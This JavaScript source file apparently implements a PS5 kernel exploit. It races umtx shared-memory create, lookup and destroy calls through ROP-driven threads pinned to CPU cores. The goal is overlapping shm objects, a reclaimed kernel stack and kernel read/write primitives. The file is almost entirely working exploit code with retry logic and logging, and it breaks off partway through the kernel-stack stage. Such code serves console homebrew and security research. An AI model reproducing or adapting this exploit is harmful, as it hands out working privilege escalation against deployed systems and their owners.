// @ts-check

/** 
 * @typedef {Object} KernelRW
 * 
 * @property {number} masterSock
 * @property {number} victimSock
 * 
 * @property {int64} kdataBase
 * @property {int64} ktextBase
 * 
 * @property {function(int64):Promise<number>} read1
 * @property {function(int64):Promise<number>} read2
 * @property {function(int64):Promise<number>} read4
 * @property {function(int64):Promise<int64>} read8
 * 
 * @property {function(int64, number):Promise<void>} write1
 * @property {function(int64, number):Promise<void>} write2
 * @property {function(int64, number):Promise<void>} write4
 * @property {function(int64, int64):Promise<void>} write8
 * 
 * @property {int64} curthrAddr
 * @property {int64} curprocAddr
 * @property {int64} procUcredAddr
 * @property {int64} procFdAddr
 * 
 * @property {int64} pipeMem
 * @property {int64} pipeAddr
 * 
 */


/**
 * @param {WebkitPrimitives} p 
 * @param {worker_rop} chain 
 * @param {function(string, LogLevel):Promise<void>} [log] 
 * @returns {Promise<KernelRW>}
 */
async function runUmtx2Exploit(p, chain, log = async () => { }) {
    const totalStartTime = performance.now();

    const debug = false;
    const doInvalidKstackMunmap = true;
    const doYieldAtDestroyWait = false;

    /**
     * @param {number} ms 
     * @returns {string}
     */
    function toHumanReadableTime(ms) {
        const seconds = ms / 1000;
        const minutes = seconds / 60;
        const hours = minutes / 60;

        let str = "";
        if (hours >= 1) {
            str += `${Math.floor(hours)}h `;
        }
        if (minutes >= 1) {
            str += `${Math.floor(minutes % 60)}m `;
        }
        if (seconds >= 1) {
            str += `${Math.floor(seconds % 60)}s `;
        }
        str += `${Math.floor(ms % 1000)}ms`;

        return str;
    }

    const config = {
        max_attempts: 100,
        max_race_attempts: 0x400,
        num_spray_fds: 0x28,
        num_kprim_threads: 0x180,
    };

    const thread_config = {
        main_thread: { core: 11, prio: 256 },
        destroyer_thread0: { core: 13, prio: 256 },
        destroyer_thread1: { core: 14, prio: 256 },
        lookup_thread: { core: 15, prio: 400 },
        reclaim_thread: { core: -1, prio: 450 }
    }

    const BUMP_ALLOCATOR_SIZE = 0x100000; // 1MB

    const MAP_PRIVATE = 0x2;
    const MAP_ANONYMOUS = 0x1000;
    const PROT_READ = 0x1;
    const PROT_WRITE = 0x2;

    const bumpAllocatorBuffer = await chain.syscall(SYS_MMAP, 0, BUMP_ALLOCATOR_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if ((bumpAllocatorBuffer.low << 0) == -1) {
        throw new Error("mmap failed");
    }
    let bumpAllocatorPos = 0;

    /**
     * @param {number} size 
     * @returns {int64}
     */
    function alloc(size) {
        if (bumpAllocatorPos + size > BUMP_ALLOCATOR_SIZE) {
            throw new Error("Bump allocator full");
        }

        const ptr = bumpAllocatorBuffer.add32(bumpAllocatorPos);
        bumpAllocatorPos += size;
        return ptr;
    }

    /**
     * 
     * @param {int64} mask_addr 
     * @returns {number}
     */
    function getCoreIndex(mask_addr) {
        let num = p.read4(mask_addr);
        let position = 0;
        while (num > 0) {
            num = num >>> 1;
            position = position + 1;
        }
        return position - 1;
    }

    const minusOneInt32 = 0xFFFFFFFF;
    const minusOneInt64 = new int64(0xFFFFFFFF, 0xFFFFFFFF);

    /**
     * @returns {Promise<number>}
     */
    async function getCurrentCore() {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        const res = await chain.syscall_int32(SYS_PS4_CPUSET_GETAFFINITY, level, which, id, setsize, mask);
        if (res != 0) {
            throw new Error("get_current_core failed");
        }

        return getCoreIndex(mask);
    }

    const RTP_LOOKUP = 0;
    const RTP_SET = 1;

    // const PRI_ITHD = 1;      /* Interrupt thread. */
    const PRI_REALTIME = 2;	 /* Real time process. */
    const PRI_TIMESHARE = 3; /* Time sharing process. */
    const PRI_IDLE = 4;      /* Idle process. */
    /**
     * @param {number} type 
     * @param {number} [prio] 
     * @param {number} [prio_type] 
     */
    async function rtprio(type, prio = 0, prio_type = PRI_REALTIME) {
        const rtprio = alloc(0x4);
        p.write2(rtprio, prio_type);
        p.write2(rtprio.add32(0x2), prio);

        const res = await chain.syscall_int32(SYS_RTPRIO_THREAD, type, 0, rtprio);
        if (res != 0) {
            throw new Error("rtprio failed");
        }

        if (type == RTP_LOOKUP) {
            return p.read4(rtprio.add32(0x2)) << 0;
        }

        return 0;
    }

    /**
     * @param {number} prio 
     * @param {number} prio_type 
     */
    async function setRtprio(prio, prio_type = PRI_REALTIME) {
        return await rtprio(RTP_SET, prio, prio_type);
    }

    /**
     * @returns {Promise<number>}
     */
    async function getRtprio() {
        return await rtprio(RTP_LOOKUP);
    }

    /**
     * @param {rop} thread 
     * @param {number} prio 
     */
    function threadSetRtPrio(thread, prio) {
        const rtprio = alloc(0x4);
        p.write2(rtprio, PRI_REALTIME);
        p.write2(rtprio.add32(0x2), prio);

        thread.self_healing_syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
    }


    /**
     * @param {number} core 
     */
    async function pinToCore(core) {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        p.write2(mask, 1 << core);

        return await chain.syscall_int32(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    /**
     * @param {rop} thread 
     * @param {number} core 
     */
    function threadPinToCore(thread, core) {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        p.write2(mask, 1 << core);

        thread.self_healing_syscall(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }


    /**
     * @param {thread_rop} thread 
     * @param {int64} addr 
     * @param {number} branch_type 
     * @param {int64|number} compare_value 
     */
    function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false, yield = true) {
        thread.while(addr, branch_type, compare_value, dereference_compare_value, () => {
            if (yield) {
                thread.self_healing_syscall(SYS_SCHED_YIELD);
            }
        });
    }





    // ----------------------------------------

    const PIPE_SIZE = 0x10000;
    const pipe_buf = alloc(PIPE_SIZE);

    const pipeSlowFds = alloc(0x8);
    const pipeSlowRes = await chain.syscall_int32(SYS_PIPE2, pipeSlowFds, 0);
    if (pipeSlowRes != 0) {
        throw new Error("pipe2 failed");
    }

    const pipeSlowReadFd = p.read4(pipeSlowFds);
    const pipeSlowWriteFd = p.read4(pipeSlowFds.add32(0x4));

    const UMTX_OP_SHM = 26; // 25 on BSD
    const UMTX_SHM_CREAT = 0x0001;
    const UMTX_SHM_LOOKUP = 0x0002;
    const UMTX_SHM_DESTROY = 0x0004;

    // Create a UMTX key area to use, these just have to be valid pointers
    const sprayFdsBuf = alloc((config.num_spray_fds * 2) * 0x8);
    const primaryShmKeyBuf = alloc(0x8);
    const secondaryShmKeyBuf = alloc(0x8);

    const commonThreadData = {
        exit: alloc(0x8),
        start: alloc(0x8),
        resume: alloc(0x8)
    };

    const threadStatus = {
        DEFAULT: 0,
        READY: 1,
        DONE: 2,
        EXITED: 3
    };

    const destroyerThread0Data = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        counter: alloc(0x8),
        destroyCount: alloc(0x8),
        shmOpCount: alloc(0x8),

        resStore: alloc(0x8),
        ftruncateSize: alloc(0x8)
    };

    
    const destroyerThread1Data = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        counter: alloc(0x8),
        destroyCount: alloc(0x8),
        shmOpCount: alloc(0x8),

        resStore: alloc(0x8),
        ftruncateSize: alloc(0x8)
    };

    const lookupThreadData = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        fd: alloc(0x8)
    };
    const lookupThread = new thread_rop(p, chain, "rop_thread_lookup");

    function resetLookupThreadState() {
        p.write4(lookupThreadData.status, threadStatus.DEFAULT);
        p.write8(lookupThreadData.cpu, 0);
        p.write8(lookupThreadData.fd, minusOneInt64);
    }

    function resetLookupThreadRop() {
        resetLookupThreadState();

        lookupThread.clear();

        threadPinToCore(lookupThread, thread_config.lookup_thread.core);
        threadSetRtPrio(lookupThread, thread_config.lookup_thread.prio);
        lookupThread.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        lookupThread.write_result(lookupThreadData.cpu);

        lookupThread.while(commonThreadData.exit, lookupThread.branch_types.EQUAL, 0, false, () => {
            lookupThread.push_write4(lookupThreadData.status, threadStatus.READY);

            threadWaitWhile(lookupThread, commonThreadData.start, lookupThread.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);

            lookupThread.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, primaryShmKeyBuf);
            lookupThread.write_result(lookupThreadData.fd);

            // https://github.com/PS5Dev/PS5-UMTX-Jailbreak/blob/2cf6778ebe89ff35255e1c228826d0d2155e9d2a/document/en/ps5/exploit.js#L705
            // HACK: sonys code is shit, so we need to account for the fact that ESRCH can be returned without setting error flag
            // if (fd == 3) { fd = -1; }
            lookupThread.if(lookupThreadData.fd, lookupThread.branch_types.EQUAL, 3, false, () => {
                lookupThread.push_write8(lookupThreadData.fd, minusOneInt64);
            });

            lookupThread.push_write4(lookupThreadData.status, threadStatus.DONE);
            threadWaitWhile(lookupThread, commonThreadData.resume, lookupThread.branch_types.EQUAL, 0);
        });

        lookupThread.push_write4(lookupThreadData.status, threadStatus.EXITED);
    }


    const destroyerThread0 = new thread_rop(p, chain, "rop_thread_destroyer0");
    function resetDestroyerThread0State() {
        p.write4(destroyerThread0Data.status, threadStatus.DEFAULT);
        p.write8(destroyerThread0Data.cpu, 0);
        p.write8(destroyerThread0Data.counter, 0);
        p.write4(destroyerThread0Data.destroyCount, 0);
        p.write4(destroyerThread0Data.shmOpCount, 0);
    }

    const destroyerThread1 = new thread_rop(p, chain, "rop_thread_destroyer1");
    function resetDestroyerThread1State() {
        p.write4(destroyerThread1Data.status, threadStatus.DEFAULT);
        p.write8(destroyerThread1Data.cpu, 0);
        p.write8(destroyerThread1Data.counter, 0);
        p.write4(destroyerThread1Data.destroyCount, 0);
        p.write4(destroyerThread1Data.shmOpCount, 0);
    }

    function resetDestroyerThread0Rop() {
        resetDestroyerThread0State();

        destroyerThread0.clear();

        threadPinToCore(destroyerThread0, thread_config.destroyer_thread0.core);
        threadSetRtPrio(destroyerThread0, thread_config.destroyer_thread0.prio);
        destroyerThread0.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        destroyerThread0.write_result(destroyerThread0Data.cpu);

        destroyerThread0.while(commonThreadData.exit, destroyerThread0.branch_types.EQUAL, 0, false, () => {
            destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.READY);

            threadWaitWhile(destroyerThread0, commonThreadData.start, destroyerThread0.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);

            // do the destroy
            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
            destroyerThread0.write_result(destroyerThread0Data.resStore);

            destroyerThread0.if(destroyerThread0Data.resStore, destroyerThread0.branch_types.EQUAL, 0, false, () => {
                destroyerThread0.increment_dword(destroyerThread0Data.destroyCount);
            });

            destroyerThread0.increment_dword(destroyerThread0Data.shmOpCount);

            // wait for lookup thread
            // while (lookupThreadData.status < DONE) { sched_yield(); }
            threadWaitWhile(destroyerThread0, lookupThreadData.status, destroyerThread0.branch_types.LESSER, threadStatus.DONE);

            // wait for destroyer 1
            // while (destroyerThread1Data.shmOpCount == 0) { sched_yield(); }
            threadWaitWhile(destroyerThread0, destroyerThread1Data.shmOpCount, destroyerThread0.branch_types.EQUAL, 0);

            destroyerThread0.if(destroyerThread0Data.destroyCount, destroyerThread0.branch_types.EQUAL, 1, false, () => {
                destroyerThread0.if(destroyerThread1Data.destroyCount, destroyerThread0.branch_types.EQUAL, 1, false, () => {
                    // if (lookupThreadData.fd > 0)
                    destroyerThread0.if(lookupThreadData.fd, destroyerThread0.branch_types.GREATER, 0, false, () => {
                        for (let i = 0; i < (config.num_spray_fds * 2); i += 2) {
                            const fdStoreAddr = sprayFdsBuf.add32(0x8 * i);

                            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, secondaryShmKeyBuf);
                            destroyerThread0.write_result(fdStoreAddr);

                            // ftruncate(fd, fd * PAGE_SIZE)
                            destroyerThread0.multiply_by_0x4000(fdStoreAddr, destroyerThread0Data.ftruncateSize);
                            destroyerThread0.self_healing_syscall_2(SYS_FTRUNCATE, fdStoreAddr, true, destroyerThread0Data.ftruncateSize, true);

                            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);
                        }
                    });
                });
            });

            destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.DONE);

            threadWaitWhile(destroyerThread0, commonThreadData.resume, destroyerThread0.branch_types.EQUAL, 0);
        });

        destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.EXITED);
    };


    function resetdestroyerThread1Rop() {
        resetDestroyerThread1State();

        destroyerThread1.clear();

        threadPinToCore(destroyerThread1, thread_config.destroyer_thread1.core);
        threadSetRtPrio(destroyerThread1, thread_config.destroyer_thread1.prio);
        destroyerThread1.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        destroyerThread1.write_result(destroyerThread1Data.cpu);

        destroyerThread1.while(commonThreadData.exit, destroyerThread1.branch_types.EQUAL, 0, false, () => {
            destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.READY);

            threadWaitWhile(destroyerThread1, commonThreadData.start, destroyerThread1.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);

            // do the destroy
            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
            destroyerThread1.write_result(destroyerThread1Data.resStore);

            destroyerThread1.if(destroyerThread1Data.resStore, destroyerThread1.branch_types.EQUAL, 0, false, () => {
                destroyerThread1.increment_dword(destroyerThread1Data.destroyCount);
            });

            destroyerThread1.increment_dword(destroyerThread1Data.shmOpCount);

            // wait for lookup thread
            threadWaitWhile(destroyerThread1, lookupThreadData.status, destroyerThread1.branch_types.LESSER, threadStatus.DONE);

            // wait for destroyer 0
            threadWaitWhile(destroyerThread1, destroyerThread0Data.shmOpCount, destroyerThread1.branch_types.EQUAL, 0);

            destroyerThread1.if(destroyerThread1Data.destroyCount, destroyerThread1.branch_types.EQUAL, 1, false, () => {
                destroyerThread1.if(destroyerThread0Data.destroyCount, destroyerThread1.branch_types.EQUAL, 1, false, () => {
                    // if (lookupThreadData.fd > 0)
                    destroyerThread1.if(lookupThreadData.fd, destroyerThread1.branch_types.GREATER, 0, false, () => {
                        for (let i = 1; i < (config.num_spray_fds * 2); i += 2) {
                            const fdStoreAddr = sprayFdsBuf.add32(0x8 * i);

                            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, secondaryShmKeyBuf);
                            destroyerThread1.write_result(fdStoreAddr);

                            // ftruncate(fd, fd * PAGE_SIZE)
                            destroyerThread1.multiply_by_0x4000(fdStoreAddr, destroyerThread1Data.ftruncateSize);
                            destroyerThread0.self_healing_syscall_2(SYS_FTRUNCATE, fdStoreAddr, true, destroyerThread1Data.ftruncateSize, true);


                            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);
                        }
                    });
                });
            });

            destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.DONE);

            threadWaitWhile(destroyerThread1, commonThreadData.resume, destroyerThread1.branch_types.EQUAL, 0);
        });

        destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.EXITED);
    };

    const kprimThreads = Array(config.num_kprim_threads);

    const kprimCommonData = {
        status: alloc(config.num_kprim_threads * 0x4),
        exit: alloc(0x8),
        thr_index: alloc(0x8),
        cmd: alloc(0x8),
        cmdCounter: alloc(0x8),
        readCounter: alloc(0x8),
        writeCounter: alloc(0x8)
    };

    const kstackKernelRwCmd = {
        NOP: 0,
        READ_QWORD: 1,
        WRITE_QWORD: 2,
        EXIT: 256,
    };

    async function waitForKprimThreadsState(states, minCount = config.num_kprim_threads) {
        if (!Array.isArray(states)) {
            states = [states];
        }

        while (true) {
            await new Promise((resolve) => setTimeout(resolve, 10));

            let matchedCount = 0;
            for (let i = 0; i < config.num_kprim_threads; i++) {
                const currentState = p.read4(kprimCommonData.status.add32(i * 0x4));
                if (states.includes(currentState)) {
                    matchedCount++;
                }
            }

            if (matchedCount >= minCount) {
                break;
            }
        }
    }

    async function resetKprimThreadsState() {
        // ask to exit if they are running
        p.write8(kprimCommonData.thr_index, minusOneInt64);
        p.write8(kprimCommonData.exit, 1);

        await waitForKprimThreadsState([threadStatus.EXITED, threadStatus.DEFAULT]);

        p.write8(kprimCommonData.exit, 0);
        p.write8(kprimCommonData.cmd, 0);
        p.write8(kprimCommonData.cmdCounter, 0);
        p.write8(kprimCommonData.readCounter, 0);
        p.write8(kprimCommonData.writeCounter, 0);
    }

    async function resetKprimThreads() {
        await resetKprimThreadsState();

        const timeoutMs = 250;

        for (let i = 0; i < config.num_kprim_threads; i++) {
            const currentThreadStatusAddr = kprimCommonData.status.add32(i * 0x4);

            const ogStatus = p.read4(currentThreadStatusAddr);
            if (ogStatus != threadStatus.DEFAULT && ogStatus != threadStatus.EXITED) {
                throw new Error("kprim thread alive?");
            }

            p.write4(currentThreadStatusAddr, threadStatus.DEFAULT);

            if (!kprimThreads[i]) {
                kprimThreads[i] = new thread_rop(p, chain, `kprim_${i}`, 0x1000, 0x200);
                kprimThreads[i].customData = {
                    cookie: alloc(0x10),
                    timeval: alloc(0x10)
                };

                p.write8(kprimThreads[i].customData.timeval, 0);
                p.write8(kprimThreads[i].customData.timeval.add32(0x8), timeoutMs * 1000);
            }

            /** @type {thread_rop} */
            const thread = kprimThreads[i];

            // @ts-ignore
            const threadData = thread.customData;

            thread.clear();

            threadSetRtPrio(thread, thread_config.reclaim_thread.prio);

            thread.push_write4(currentThreadStatusAddr, threadStatus.READY);

            thread.while(kprimCommonData.exit, thread.branch_types.EQUAL, 0, false, () => {
                thread.push_write8(threadData.cookie, 0x13370000 + i);
                thread.self_healing_syscall(SYS_SELECT, 1, threadData.cookie, 0, 0, threadData.timeval);
                thread.self_healing_syscall(SYS_SCHED_YIELD);
            });

            thread.if(kprimCommonData.thr_index, thread.branch_types.EQUAL, i, false, () => {
                thread.while(kprimCommonData.cmd, thread.branch_types.LESSER, kstackKernelRwCmd.EXIT, false, () => {

                    // wait until it receives command
                    threadWaitWhile(thread, kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.NOP);

                    // read cmd
                    thread.if(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.READ_QWORD, false, () => {
                        thread.increment_dword(kprimCommonData.readCounter);
                        thread.self_healing_syscall(SYS_WRITE, pipeSlowWriteFd, pipe_buf, 8);
                    });

                    // write cmd
                    thread.if(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.WRITE_QWORD, false, () => {
                        thread.increment_dword(kprimCommonData.writeCounter);
                        thread.self_healing_syscall(SYS_READ, pipeSlowReadFd, pipe_buf, 8);
                    });

                    thread.increment_dword(kprimCommonData.cmdCounter);

                    thread.if_not(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.EXIT, false, () => {
                        // reset for next run
                        thread.push_write4(kprimCommonData.cmd, kstackKernelRwCmd.NOP);
                    });
                });
            });

            thread.push_write4(currentThreadStatusAddr, threadStatus.EXITED);
        }
    }

    async function waitForRaceThreadsState(state) {
        while (true) {
            await new Promise((resolve) => setTimeout(resolve, 1));

            const lookupThreadStatus = p.read4(lookupThreadData.status);
            if (lookupThreadStatus != state) {
                continue;
            }

            const destroyerThread0Status = p.read4(destroyerThread0Data.status);
            if (destroyerThread0Status != state) {
                continue;
            }

            const destroyerThread1Status = p.read4(destroyerThread1Data.status);
            if (destroyerThread1Status != state) {
                continue;
            }

            return;
        }
    }


    async function checkMemoryAccess(addr, checkSize = 1) {
        const pipesBuf = alloc(0x8);
        const pipesRes = await chain.syscall_int32(SYS_PIPE2, pipesBuf, 0);
        if (pipesRes != 0) {
            await log("pipe2 failed", LogLevel.ERROR);
            return false;
        }

        const readFd = p.read4(pipesBuf);
        const writeFd = p.read4(pipesBuf.add32(0x4));

        const checkBuf = alloc(checkSize);

        const actualWriteSize = await chain.syscall_int32(SYS_WRITE, writeFd, addr, checkSize);
        let result = actualWriteSize == checkSize;
        if (!result) {
            result = false;
        }

        if (result && actualWriteSize > 1) {
            const actualReadSize = await chain.syscall_int32(SYS_READ, readFd, checkBuf, checkSize);
            if (actualReadSize != actualWriteSize) {
                result = false;
            }
        }

        chain.add_syscall(SYS_CLOSE, readFd);
        chain.add_syscall(SYS_CLOSE, writeFd);

        await chain.run();

        return result;
    }


    /**
     * 
     * @param {int64} kstack 
     * @returns {number|null} - kprim id
     */
    function verifyKstack(kstack) {
        const cnt = 0x1000 / 8;

        for (let i = 0; i < cnt; i++) {
            const qword = p.read8(kstack.add32(0x3000 + (i * 8)));
            const num = qword.low << 0;
            if (num == 0) {
                continue;
            }

            if ((num >> 16) == 0x1337) {
                return num & 0xfff;
            }
        }

        return null;
    }


    const OFFSET_STAT_SIZE = 0x48;
    const getFdSizeTempBuffer = alloc(0x100);
    async function getFdSize(fd) {
        const res = await chain.syscall_int32(SYS_FSTAT, fd, getFdSizeTempBuffer);
        if (res == -1) {
            return null;
        }

        return p.read4(getFdSizeTempBuffer.add32(OFFSET_STAT_SIZE));
    }

    async function getShmFdFromSize(lookupFd) {
        if (lookupFd == -1) {
            return null;
        }

        let sizeFd = await getFdSize(lookupFd);
        if (!sizeFd) {
            return null;
        }

        sizeFd /= 0x4000;
        if (sizeFd <= 0x6 || sizeFd >= 0x400 || sizeFd == lookupFd) {
            return null;
        }

        return sizeFd;
    }


    let fdsToFix = [];
    let kstacksToFix = [];


    async function resetCommonData() {
        const lookupFd = p.read4(lookupThreadData.fd) << 0;

        if (lookupFd > 0 && !fdsToFix.includes(lookupFd)) {
            chain.add_syscall(SYS_CLOSE, lookupFd);
            p.write4(lookupThreadData.fd, -1);
        }

        chain.add_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
        chain.add_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);

        await chain.run();

        p.write8(commonThreadData.exit, 0);
        p.write8(commonThreadData.start, 0);
        p.write8(commonThreadData.resume, 0);
    }

    ///////////////////////////////////////////////////////////////////////
    // Start
    ///////////////////////////////////////////////////////////////////////


    const ogCore = await getCurrentCore();
    if (debug) await log(`Main thread original core: ${ogCore}`, LogLevel.DEBUG);

    const ogPrio = await getRtprio();
    if (debug) await log(`Main thread original prio: ${ogPrio}`, LogLevel.DEBUG);

    await pinToCore(thread_config.main_thread.core);
    await setRtprio(thread_config.main_thread.prio);
    if (debug) await log("Set main thread core and prio", LogLevel.DEBUG);

    let winnerFd = null;
    let winnerLookupFd = null;
    let kstack = null;

    let checkMemoryAccessFailCount = 0;

    await log("Triggering race...", LogLevel.LOG);

    for (let i = 1; i <= config.max_attempts; i++) {
        // await log(`Attempt ${i}`, LogLevel.LOG);

        resetLookupThreadRop();
        resetDestroyerThread0Rop();
        resetdestroyerThread1Rop();

        p.write8(commonThreadData.exit, 0);
        p.write8(commonThreadData.start, 0);
        p.write8(commonThreadData.resume, 0);

        winnerFd = null;
        winnerLookupFd = null;
        kstack = null;

        // Start threads - we made sure previous ones exited at the end of this loop
        await lookupThread.spawn_thread();
        await destroyerThread0.spawn_thread();
        await destroyerThread1.spawn_thread();
        if (debug) await log("Spawned threads, waiting for them to be ready...", LogLevel.DEBUG);

        await waitForRaceThreadsState(threadStatus.READY);
        if (debug) await log("All threads ready", LogLevel.DEBUG);

        let count = 0;

        const mainFdBuf = alloc(0x8);
        const mainFdSizeBuf = alloc(0x8);

        const beforeRaceTime = performance.now();

        for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
            if (i2 % 10 == 0) {
                if (debug) {
                    await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                } else {
                    await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                }
            }

            // umtx_shm_create
            chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
            chain.write_result(mainFdBuf);

            chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
                chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
                chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
                chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
            });

            await chain.run();

            await waitForRaceThreadsState(threadStatus.READY);

            p.write8(commonThreadData.resume, 0);
            p.write8(commonThreadData.start, 1);

            await waitForRaceThreadsState(threadStatus.DONE);

            let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);

            let lookupFd = p.read4(lookupThreadData.fd) << 0;

            if (destroyCount == 2) {
                const fd = await getShmFdFromSize(lookupFd);
                if (fd) {
                    winnerFd = fd;
                    winnerLookupFd = lookupFd;
                    await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
                }
            }

            // dont close lookup descriptor right away when it is possibly corrupted
            if (destroyCount == 2 && lookupFd != 3 && lookupFd != -1) {
                fdsToFix.push(lookupFd);
            }

            // close other fds
            for (let i3 = 0; i3 < (config.num_spray_fds * 2); i3++) {
                const addr = sprayFdsBuf.add32(0x8 * i3);
                const fd = p.read4(addr) << 0;
                if (fd > 0 && fd != winnerFd) {
                    chain.add_syscall(SYS_CLOSE, fd);
                }
                chain.push_write8(addr, 0);
            }
            await chain.run();

            // we have won the race
            if (winnerFd) {
                break;
            }

            await resetCommonData();
            resetLookupThreadState();
            resetDestroyerThread0State();
            resetDestroyerThread1State();

            if (i2 !== config.max_race_attempts - 1) {
                p.write8(commonThreadData.resume, 1);
            }

            count++;
        }

        if (count != config.max_race_attempts) {
            if (debug) await log(`Race won after ${count} attempts`, LogLevel.INFO);
        } else {
            if (debug) await log("Race max attempts reached, retrying...", LogLevel.INFO);
        }

        const afterRaceTime = performance.now();
        if (debug) await log(`Race took ${toHumanReadableTime(afterRaceTime - beforeRaceTime)}`, LogLevel.INFO);

        // signal all threads to exit
        p.write8(commonThreadData.exit, 1);
        p.write8(commonThreadData.resume, 1);

        if (debug) await log("Waiting for all threads to exit...", LogLevel.DEBUG);

        await waitForRaceThreadsState(threadStatus.EXITED);

        if (debug) await log("All threads exited", LogLevel.DEBUG);

        if (!winnerFd) {
            if (debug) await log("Loser", LogLevel.ERROR);
            continue;
        }

        // we have 2 fd referencing a shmfd which will be freed if we close 1 fd
        let closeRes = await chain.syscall_int32(SYS_CLOSE, winnerFd);
        if (closeRes != 0) {
            await log("Failed to close winnerFd", LogLevel.WARN);
            continue;
        }

        // map memory of freed shm object
        const PROT_NONE = 0x0;
        const MAP_SHARED = 0x1;

        // @ts-ignore
        kstack = await chain.syscall(SYS_MMAP, 0, 0x4000, PROT_NONE, MAP_SHARED, winnerLookupFd, 0);
        if ((kstack.low << 0) == -1) {
            await log("Failed to mmap kstack", LogLevel.WARN);
            continue;
        }

        await resetKprimThreads();

        for (let i = 0; i < config.num_kprim_threads; i++) {
            const thread = kprimThreads[i];
            thread.spawn_thread_chain();
        }

        if (debug) await log("Going to spawn kprim threads...", LogLevel.DEBUG);
        await chain.run();
        if (debug) await log("kprim threads spawned", LogLevel.DEBUG);

        // wait for kprim threads to be ready
        await waitForKprimThreadsState(threadStatus.READY);

        if (debug) await log(`All kprim threads ready ${config.num_kprim_threads}`, LogLevel.DEBUG);

        if (closeRes != 0 || (kstack.low << 0) == -1) {
            await log("Failed to reclaim kstack. Retrying...", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            continue;
        }

        kstacksToFix.push(kstack);

        if (debug) await log(`Managed to reclaim kstack with mmap. kstack = ${kstack.toString(16)}`, LogLevel.INFO);

        // change memory protections to r/w
        const PROT_READ = 0x1;
        const PROT_WRITE = 0x2;
        const mprotectRes = await chain.syscall_int32(SYS_MPROTECT, kstack, 0x4000, PROT_READ | PROT_WRITE);
        if (mprotectRes != 0) {
            await log("mprotect failed. Retrying...", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            continue;
        }

        if (debug) await log("Managed to modify kstack memory protection to r/w", LogLevel.INFO);

        // check if we have access to the page
        const checkRes = await checkMemoryAccess(kstack);
        if (!checkRes) {
            checkMemoryAccessFailCount++;
            await log("Failed to access kstack memory. Retrying...", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            await new Promise((resolve) => setTimeout(resolve, 100));
            continue;
        }

        await log("kstack can be accessed", LogLevel.SUCCESS);

        const kprimId = verifyKstack(kstack);
        if (kprimId == null) {
            await log("Failed to get kprim id from kstack. Retrying..", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            continue;
        }

        // ask all kprim threads to exit, except for thread that reclaims kstack
